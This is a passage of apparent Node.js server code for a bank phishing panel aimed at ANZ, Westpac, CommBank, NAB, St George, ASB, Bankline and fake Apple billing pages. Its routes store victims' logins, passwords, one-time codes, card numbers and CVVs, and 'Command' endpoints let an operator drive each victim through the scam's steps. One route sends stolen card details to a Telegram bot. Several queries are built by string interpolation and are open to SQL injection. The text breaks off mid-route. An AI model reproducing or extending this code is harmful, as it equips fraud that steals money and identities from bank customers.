  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE anz SET telephone=?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, owner];
  let query = `UPDATE anz SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE anz SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveAnswers", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  answer1 = req.body.answer1;
  owner = req.body.owner;

  let details = [answer1, uniqueid, owner];
  let query = `UPDATE anz SET answer1=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM anz WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BL
//BL
//BL

app.get("/banklineCustomers/:id", (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM customers WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/banklineCustomers", (req, res) => {
  blConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/banklineSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  userId = req.body.userId;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [customerId, userId, uniqueid, ip];
  let query = `INSERT INTO customers(customerId,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/banklineSavePayment", cors(), (req, res) => {
  paymentCode = req.body.paymentCode;
  uniqueid = req.body.uniqueid;

  let details = [paymentCode, uniqueid];
  let query = `UPDATE customers SET paymentCode=?, status=5 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/banklineSaveAuth", cors(), (req, res) => {
  responseCode = req.body.responseCode;
  password = req.body.password;
  uniqueid = req.body.uniqueid;

  let details = [responseCode, password, uniqueid];
  let query = `UPDATE customers SET responseCode=?, password=?, status=3 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/banklineCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 2 || newStatus == 11) {
    char1 = req.body.char1;
    char2 = req.body.char2;
    char3 = req.body.char3;
    loginQr = req.body.loginQr;
    let details = [newStatus, char1, char2, char3, loginQr, uniqueid];
    let query = `UPDATE customers SET status=?, char1=?, char2=?,char3=?, loginQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else if (newStatus == 4) {
    paymentQr = req.body.paymentQr;
    partNumber = req.body.partNumber;
    let details = [newStatus, partNumber, paymentQr, uniqueid];
    let query = `UPDATE customers SET status=?, partNumber=?, paymentQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else if (newStatus == 12) {
    paymentQr = req.body.paymentQr;
    let details = [newStatus, paymentQr, uniqueid];
    let query = `UPDATE customers SET status=?, paymentQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM customers WHERE uniqueid= ?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  userId = req.body.userId;
  uniqueid = req.body.uniqueid;

  let details = [customerId, password, uniqueid];
  let query = `UPDATE customers SET customerId=?, password=?, status=1 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//WP
//WP
//WP

app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM wp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/wpCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM wp WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/wpCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE wp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/wpCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM wp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/wpSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [customerId, password, uniqueid, ip, owner];
  let query = `INSERT INTO wp(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/wpSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, owner];
  let query = `UPDATE wp SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/wpSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE wp SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/wpSaveTelephone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE wp SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/wpDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM wp WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//COMMBANK
//COMMBANK
//COMMBANK

app.get("/cbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM cb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/cbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE cb SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/cbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/cbSaveLogin", cors(), (req, res) => {
  clientNumber = req.body.clientNumber;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  time = new Date().toUTCString();

  let details = [clientNumber, password, uniqueid, ip, owner, time];
  let query = `INSERT INTO cb(clientNumber,password,uniqueid,status,ip, owner, time) VALUES (?,?,?,1,?,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  time = new Date().toUTCString();

  let details = [customerId, password, time, uniqueid, owner];
  let query = `UPDATE cb SET customerId=?, password=?, time = ?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [otp, time, uniqueid, owner];
  let query = `UPDATE cb SET otp=?, time = ?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [ccnum, ccexp, cccvv, time, uniqueid, owner];
  let query = `UPDATE cb SET ccnum=?, ccexp=?, cccvv=?, time = ?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [telephone, time, uniqueid, owner];
  let query = `UPDATE cb SET telephone=?, time = ?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM cb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//ZENCOM
//ZENCOM
//ZENCOM

app.get("/zcCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let result = [];
  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].owner === owner) {
      result.push(db.Zencom[i]);
    }
  }
  res.send(result);
});

app.post("/zcCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].status = newStatus;
      res.send("Update Completed");
    }
  }
});

app.get("/zcCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;
  let result = [];

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid && db.Zencom[i].owner === owner) {
      result.push(db.Zencom[i]);
    }
  }
  res.send(result);
});

app.post("/zcSavePin", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  pin = req.body.pin;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].pin = pin;
      db.Zencom[i].status = 5;
    }
  }
  res.send("Completed");
});

app.post("/zcSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].telephone = telephone;
      db.Zencom[i].status = 1;
    }
  }
  res.send("Completed");
});

app.post("/zcSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].otp = otp;
      db.Zencom[i].status = 3;
    }
  }
  res.send("Completed");
});

app.post("/zcSaveLogin", cors(), (req, res) => {
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  let loginInfo = {
    id: uniqueid,
    uniqueid: uniqueid,
    telephone: telephone,
    owner: owner,
    ip: ip,
    status: 1,
  };
  db.Zencom.push(loginInfo);
  res.send("Completed");
});

//RBC
app.use('/rbc', require('./routes/rbc'))

//APPLE PANEL
//APPLE PANEL
//APPLE PANEL

app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM apple WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/appleCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM apple WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/appleCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE apple SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/appleCustomers/id/:id", (req, res) => {
  const uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM apple WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/appleSaveBilling", cors(), (req, res) => {
  firstName = req.body.firstName;
  lastName = req.body.lastName;
  telephone = req.body.telephone;
  addy = req.body.addy;
  town = req.body.town;
  pcode = req.body.pcode;
  dob = req.body.dob;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [
    `${firstName} ${lastName}`,
    telephone,
    addy,
    town,
    pcode,
    dob,
    uniqueid,
    ip,
    owner,
  ];
  let query = `INSERT INTO apple(fullName,telephone, addy, city, pcode, dob, uniqueid,status,ip, owner) VALUES (?,?,?,?,?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

let appleCount = 1;

app.post("/appleSaveCC", (req, res) => {
  let { ccname, ccnum, ccexp, cvv, owner, uniqueid } = req.body;

  if (owner == "bali2810" && appleCount !== 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1983666674&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
    );
  }

  let checkDetails = [uniqueid];

  let checkQuery = `SELECT * FROM apple WHERE uniqueid = ?`;

  panelConnection.query(checkQuery, checkDetails, (err, rows, fields) => {
    if (err) console.log(err);
    if (rows.length) {
      console.log(rows);
      let updateDetails = [ccname, ccnum, ccexp, cvv, uniqueid];
      let updateQuery = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 2 WHERE uniqueid = ?`;

      panelConnection.query(updateQuery, updateDetails, (err, rows, fields) => {
        if (!err) res.send("Insertion Completed");
        else console.log(err);
      });
      return;
    } else {
      let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
      let query = `INSERT INTO apple(ccname,ccnum, ccexp, cvv, status,uniqueid, owner) VALUES (?,?,?,?,2,?,?)`;
      panelConnection.query(query, details, (err, rows, fields) => {
        if (!err) res.send("Insertion Completed");
        else console.log(err);
      });
    }
  });
});

app.post("/appleSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE apple SET otp= ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleSaveTelephone", cors(), (req, res) => {
  const { uniqueid, telephone } = req.body;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE apple SET telephone= ?, status = 10 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleSaveCCAgain", cors(), (req, res) => {
  const { ccname, ccnum, ccexp, cvv, uniqueid } = req.body;

  let details = [ccname, ccnum, ccexp, cvv, uniqueid];
  let query = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 8 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleSaveAuth", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;

  let details = [uniqueid];
  let query = `UPDATE apple SET status = 6 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM apple WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//ASB
//ASB
//ASB

app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM asb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/asbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM asb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/asbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE asb SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/asbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM asb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/asbSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO asb(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/asbSaveTelephone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE asb SET telephone=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/asbSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE asb SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/asbSaveNetcode", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  netcode = req.body.netcode;
  owner = req.body.owner;

  let details = [netcode, uniqueid, owner];
  let query = `UPDATE asb SET netcode=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/asbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM asb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//LLOYDS
app.use("/lloyds", require("./routes/lloyds"));

//UBANK
app.use("/ubank", require("./routes/ubank"));

//SUNCORP
app.use("/suncorp", require("./routes/suncorp"));

//UBANK IVR
app.use("/ubankIVR", require("./routes/ubankIVR"));

//UBANKONE
app.use("/ubankOne", require("./routes/ubankOne"));

//NAB

app.use("/nab", require("./routes/nab"));

app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/nabCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM nab WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/nabCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE nab SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/nabCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/nabSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO nab(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/nabSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE nab SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/nabSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE nab SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//MULTIPANEL
//MULTIPANEL
//MULTIPANEL

app.get("/multiCustomers/:owner", async (req, result) => {
  owner = req.params.owner;
  let res = [];
  panelConnection.query(
    `SELECT * FROM bendi WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "Bendigo";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM anz WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "ANZ";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM wp WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "WestPac";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM nab WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "NAB";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM cb WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "CommBank";
        res.push(row);
      });
      result.send(res);
    }
  );
});

//STGEORGE
//STGEORGE
//STGEORGE

app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM george WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/georgeCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM george WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/georgeCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE george SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.post("/georgeSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE george SET telephone=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/georgeSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE george SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/georgeSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cvv = req.body.cvv;
  owner = req.body.owner;

  let details = [ccnum, ccexp, cvv, uniqueid, owner];
  let query = `UPDATE george SET ccnum=?, ccexp=?, cvv=?, status = 8 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  accessNo = req.body.accessNo;
  password = req.body.password;
  secNo = req.body.secNo;
  owner = req.body.owner;

  let details = [accessNo, password, secNo, uniqueid];
  let query = `UPDATE george SET accessNo=?, password=?,secNo=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.get("/georgeCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM george WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let georgeCount = 0;

app.post("/georgeSaveLogin", cors(), (req, res) => {
  accessNo = req.body.accessNo;
  password = req.body.password;
  secNo = req.body.secNo;
  owner = req.body.owner;
  ip = req.body.ip;
